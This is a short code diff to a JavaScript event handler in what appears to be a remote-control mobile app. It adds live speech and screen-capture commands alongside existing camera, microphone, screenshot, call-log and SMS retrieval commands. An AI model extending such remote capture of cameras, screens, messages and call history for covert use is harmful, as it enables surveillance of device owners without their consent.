@@ -115,8 +115,17 @@ function handleNativeEvent(e) {
     case 'cmd:camera:stop:back':   setIndicator('cam', false, 'Inactive'); break
     case 'cmd:mic:on':             setIndicator('mic', true, 'Active'); break
     case 'cmd:mic:off':            setIndicator('mic', false, 'Inactive'); break
+    case 'cmd:speak:live:start':   setIndicator('speak', true, 'Live'); break
+    case 'cmd:speak:live:stop':    setIndicator('speak', false, 'Inactive'); break
     case 'cmd:speak':              setIndicator('speak', true, 'Playing…'); break
     case 'speak:done':             setIndicator('speak', false, 'Inactive'); break
+    // Screen capture — must go through JS to trigger activity result dialog
+    case 'cmd:screen:start':
+      if (NativeSocket) NativeSocket.requestScreenCapture().catch(() => {})
+      break
+    case 'screen:started':  setIndicator('cam', true, 'Screen On'); break
+    case 'screen:denied':   break
+    case 'cmd:screen:stop': setIndicator('cam', false, 'Inactive'); break
     case 'cmd:screenshot':   break  // handled natively
     case 'cmd:get:calllogs': sendCallLogs(); break
     case 'cmd:get:sms':      sendSMS(); break
